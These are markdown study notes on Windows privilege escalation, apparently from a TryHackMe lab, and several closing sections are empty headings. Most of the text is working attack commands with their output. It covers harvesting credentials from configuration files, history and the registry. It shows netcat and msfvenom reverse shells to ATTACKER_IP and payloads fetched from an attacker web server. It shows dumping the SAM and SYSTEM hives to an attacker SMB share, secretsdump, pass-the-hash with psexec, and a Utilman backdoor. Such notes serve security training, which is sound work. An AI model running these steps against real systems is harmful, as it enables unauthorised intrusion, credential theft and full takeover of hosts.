# Windows Privilege Escalation
* Using given access to a host with "user A".
* Abuse a weakness to gain access to "user B" on the system.
* May have to escalate into other unprivileged users before gaining administrative privileges.
* May find credentials in unsecured text files / spreadsheets.
* May have to abuse a weakness.
  * Service / scheduled task misconfigurations.
  * Excessive account privileges.
  * Vulnerable software.
  * Missing OS security patches.
## Windows Users

| User | Privileges
| --- | ---
| Administrators | Most privileges. Can change any system configuration parameter and access any file on the system.  Will be a member of the **Administrators** group.
| Standard Users | Can only perform limited tasks. Typically cannot make permanent or essential changes to the system and are limited to their own files.  Will be part of the **Users** group.
| SYSTEM / LocalSystem | Used by the OS to perfrom internal tasks. Full access to all files and resources on the system with even higher privileges than administrators.
| Local Service | Default account used to run services with "minimum" privileges. Uses anonymous connections over the network.
| Network Service | Default account used to run services with "minimum" privileges. Uses the computer credentials to authenticate through the network.

# Harvesting Passwords from Usual spots
* Easiest way to gain access to another user is to gather credentials from a compromised machine.
## Unattended Windows Installations
* Administrators may use Windows Deployment Services (WDS) when installing Windows on a large number of hosts.
  * Single OS system image deployed to many hosts through the network.
  * AKA unattended installations.
    * Does not require user interaction.
  * Requires administrator account to perfrom initial setup.
    * Credentials may be stored on the machine.
      * `C:\Unattend.xml`
      * `C:\Windows\Panther\Unattend.xml`
      * `C:\Windows\Panther\Unattend\Unattend.xml`
      * `C:\Windows\system32\sysprep.inf`
      * `C:\Windows\system32\sysprep\sysprep.xml`
## PowerShell History
* Commands run using PowerShell are stored in a file.
* Useful for quickly repeating commands used before.
* User may include a password directly in a command.
* Retrieve history using `cmd.exe`.
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt
```
* Retrieve history using PowerShell.
```
$ENV:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt
```
## Saved Windows Credentials
* Windows allows other credentials to be used.
* List saved credentials (cannot see passwords).
```
cmdkey /list
```
* Sample output.
```
Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```
* Try any "interesting" credentials using `runas`.
```
runas /savecred /user:mike.katz cmd.exe
```
## Internet Information Services (IIS) Configuration
* Default web server on Windows.
* Configuration stored in `web.config` file.
  * This may store database passwords or configured authentication mechanisms.
* Possible `web.config` locations.
  * `C:\inetpub\wwwroot\web.config`
  * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
* Find database connection string in the file.
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
* Sample output.
```
<add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
<add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
<connectionStrings>
<add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
</connectionStrings>
```
## Retrieve Credentials from Software: PuTTY
* PuTTY is SSH client commonly found on Windows systems.
* Users can store sessions where proxy configurations may include cleartext authentication credentials.
* Retrieve stored proxy credentials from the registry.
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
* Sample output.
```
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```
* Any software that stores passwords (browsers, email clients, FTP clients, SSH clients VNC software) may have methods to recover passwords saved by the user.

# Other Quick Wins
* Some misconfigurations can allow higher privileged user access to be obtained.

## Scheduled Tasks
* May find a scheduled task that either lost its binary or is using a binary that can be modified.
* Use `schtasks` to list sheduled tasks.
* Detailed information can be retrieved about any of the services.
```
schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
``` 
* `Task to Run` parameter indicates what gets executed by the scheduled task.
* `Run as User` parameter shows the user that will execute the task.
* What gets executed by the "Run as User" can be controlled if current user can modify "Task to Run".
  * Results in simple privilege escalation.
* Check File permissions on executable.
```
icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```
* `(F)` means full access over the binary.
  * Can modify .bat and insert any payload.
* Change bat file to spawn reverse shell.
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
* Start listener on attacker machine.
```
nc -lvnp 4444
Listening on 0.0.0.0 4444
```
* Attacker will recieve reverse shell with taskusr1 privileges when sheduled task next runs.
* Start task manually (if current user has permissions).
```
schtasks /run /tn vulntask
```
* Attacker will immediately receive the reverse shell.
```
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```
## AlwaysInstallElevated
* Windows installer files (.msi) usually run with privilege level of user that executed it.
  * Can be configured to run with higher privileges.
* Generate malicious MSI file that runs with admin privileges.
* Requires two registry values to be set to exploit the vulnerabilty.
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
* Generate MSI reverse shell file using `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.189.232 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
* Transfer malicious file to target.
* Run properly configured Metasploit handler module on attacking machine.
* Run installer on target to receive the reverse shell.
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
# Abusing Service Misconfigurations
## Windows Services
* Managed by Service Control Manager (SCM).
* Each service has associated executable run by SCM whenever service is started.
* Not any executable can be started as a service successfully.
  * Service executables implement special functions to communicate with SCM.
* Services specify the user account under which they will run.
* `sc qc` shows structure of `apphostsvc` service.
```
sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
``` 
* **BINARY_PATH_NAME** specifies associated executable.
* **SERVICE_START_NAME** species the account used to run the service.
* Services have a Discretionary Access Control List (DACL).
  * Defines who has permission to start, stop, pause, query status, query configuration, or reconfigure the service.
* DACL can be seen from Process Hacker.
* All services configurations are stored in the registry.
```
HKLM\SYSTEM\CurrentControlSet\Services\
```
* Subkey exists for each service.
  * **ImagePath** shows associated executable.
  * **ObjectName** shows account used to start the service.
  * **Security** stores DACL if configured for the service.
* Only administrators can modify these registry entries by default.

## Insecure Permissions on Service Executable
* Attacker can gain privileges of service's account trivially if service executable has insecure permsissions.
* Splinterware System Scheduler vulnerability example.
```
sc.exe qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
* Check permissions on the executable.
```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
* Everyone group has modify permissions `(M)` on executable.
* Executable can be overwritten with malicious payload.
* Service will be executed with privileges of "svcuser1" user account.
* Generate exe-service payload using `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
``` 
* Serve payload through python webserver.
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Pull payload from PowerShell.
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
``` 
* Replace service executable with payload.
```
cd C:\PROGRA~2\SYSTEM~1\

move WService.exe WService.exe.bkp
        1 file(s) moved.

move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.
```
* Grant full permissions to Everyone group as need another user to execute payload.
```
icacls WService.exe /grant Everyone:F
```
* Start reverse listener on attacking machine.
```
nc -lvnp 4445
Listening on 0.0.0.0 4445
```
* Restart service (if current user has permissions).
* PowerShell has `sc` as an alias to `Set-Content`.
  * Need to use `sc.exe` to control services with PowerShell this way.
```
sc.exe stop windowsscheduler
sc.exe start windowsscheduler
```
* Reverse shell with "svcusr1" privileges received.
```
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```
## Unquoted Service Paths
* Used when unable to directly write into service executables.
* Very particular behaviour occurs when a service is configured to point to an "unquoted" executable.
  * Path of executable not properly quoted to account for spaces.
```
sc.exe qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
* Spaces on name of "Disk Sorter Enterprise" folder make command ambiguous.
* SCM does not know what to execute.

| Command | Arguement 1 | Arguement 2
| --- | --- | ---
| `C:\MyPrograms\Disk.exe` | `Sorter` | `Enterprise\bin\disksrs.exe`
| `C:\MyPrograms\Disk Sorter.exe` | `Enterprise\bin\disksrs.exe` |
| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` | |

* Spaces usually used as argument seperators unless part of quoted string.
* SCM tries to help by searching for each of the binaries in the above table order.
* Attacker creates any of the executables searched for before the expected service executable.
  * Forces service to run arbitary executable.
* Most service executables installed where unprivileged users cannot write.
  * `C:\Program Files`
  * `C:\Program Files (x86)`
* Some installers reduce permissions of installed folder.
* Administrator may install service binaries in world-writable non-default path.
* `c:\MyPrograms` inherits permissions of `C:\`.
  * Any user can create files and folders. 
```
icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
* `BUILTIN\Users` group has `(AD)` (create subdirectories) and `(WD)` (create files) privileges on folder.
* Create `msfvenom` exe-service payload.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```
* Serve payload through python webserver.
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Pull payload from PowerShell.
```
wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
``` 
* Start listener to receive reverse shell.
```
nc -lvnp 4446
Connection received on 10.10.175.90 50650
```
* Move payload to `c:\MyPrograms\Disk.exe`.
```
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```
* Grant Everyone full permission on file.
  * Ensures file can be executed by the service.
```
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```
* Restart service to execute payload.
```
sc.exe stop "disk sorter enterprise"
sc.exe start "disk sorter enterprise"
```
* Reverse shell with "svcusr2" privileges received.
```
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```
## Insecure Service Permissions
* Service DACL (not service's executable DACL) allows reconfiguration of the service.
* Point service at any executable and run it with any account.
* [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from Sysinternals suite used to check for service DACL.
  * Command to check for "thmservice" DACL.
```
accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```
* `BUILTIN\Users` group has `SERVICE_ALL_ACCESS` permission.
   * Any user can reconfigure service.
* Build exe-service reverse shell in `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```
* Start listener for connection on attacker's machine.
```
nc -lvnp 4447
Listening on [0.0.0.0] (family 0, port 4447)
```
* Serve payload through python webserver.
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Pull payload from PowerShell.
```
wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe
``` 
* Move payload to `C:\Users\thm-unpriv\rev-svc3.exe` if necessary.
* Grant "Everyone" permission to execute payload.
```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```
* Change service's associated executable and account.
  * Note spaces after equal signs when using `sc`.
  * LocalSystem account chosen as it is highest privilege account available.
```
sc.exe config thmservice binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
* Restart service to trigger payload.
```
sc.exe stop thmservice

[SC] ControlService FAILED 1062:

The service has not been started.

sc.exe start thmservice

SERVICE_NAME: thmservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3328
        FLAGS              :
```
* Shell recieved back to attacker with SYSTEM privileges.
```
Connection from 10.10.29.166 49894 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
# Abusing Dangerous Privileges
## Windows Privileges
* `whoami /priv` checks user's assigned privileges.
* [Full list of available Windows privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
* Comprehensive list of exploitable privileges on [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.
## SeBackup / SeRestore Privileges
* Allows users to read and write to any file in the system.
  * Ignores any DACL in place.
* Rationale is to allow certain users to perform backups without requiring full admin rights.
* Attacker can trivially escalate privileges with these privileges.
### Copy SAM and SYSTEM registry hives to extract Administrator's password hash
#### 1. RDP to target.
```
xfreerdp /u:THMBackup /p:CopyMaster555 /v:10.10.21.86
```
* "THMBackup" is member of "Backup Operators" group.
  * Granted SeBackup and SeRestore privileges.
#### 2. Open command prompt using "Open as administrator" to use the elevated privileges.
* Check account's privileges.
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
#### 3. Backup SAM and SYSTEM hashes.
```
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```
#### 4. Copy files to attacker machine.
* Use impacket's `smbserver.py` to start SMB server with a network share.
```
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
  * Creates share named `public` pointing to 'share' directory.
  * Directory requires credentials of current Windows session.
* Transfer both files from target to attacking machine.
```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
#### 5. Use impacket to retrieve users' password hashes.
```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
```
#### 6. Perform Pass-the-Hash attack to gain access to target with SYSTEM privileges.
```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.21.86
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on 10.10.21.86.....
[*] Found writable share ADMIN$
[*] Uploading file uoQARDky.exe
[*] Opening SVCManager on 10.10.21.86.....
[*] Creating service jeuG on 10.10.21.86.....
[*] Starting service jeuG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system
```
## SeTakeOwnership Privilege
* Allows user to take ownership of any object on a system.
* Opens up many possibilities for an attacker to elevate privileges.
  * E.g. Take ownership of a service's executable that is running as SYSTEM.
### Abuse `utilman.exe` to escalate privileges
* Utilman is built-in Window app used to provide Ease of Access options during lock screen.
* Runs with SYSTEM privileges.
#### 1. RDP to target machine.
```
xfreerdp /u:THMTakeOwnership /P:TheWorldIsMine2022 /v:10.10.33.51
```
#### 2. Open command prompt using "Open as administrator" to get the SeTakeOwnership privilege.
* Check privileges.
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
``` 
#### 3. Take ownership of utilman.
```
takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership"
```
#### 4. Assign owner account full privileges on file.
```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```
#### 5. Replace utilman.exe with copy of cmd.exe.
```
cd c:\Windows\System32\
copy utilman.exe %temp%
        1 file(s) copied.
copy cmd.exe utilman.exe
Overwrite Utilman.exe (Yes/No/All): yes
        1 file(s) copied.
```
#### 6. Trigger utilman by locking screen.
* Click on "Ease of Access" button.
* Runs cmd.exe with SYSTEM privileges.
```
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) 2018 Microsoft Corporation. All rights reserved.
Not enough memory resources are available to process this command.

C:\Windows\system32>whoami
nt authority\system
```
## SeImpersonate / SeAssignPrimaryToken

# Abusing Vulnerable Software


# Tools of the Trade


# Conclusion
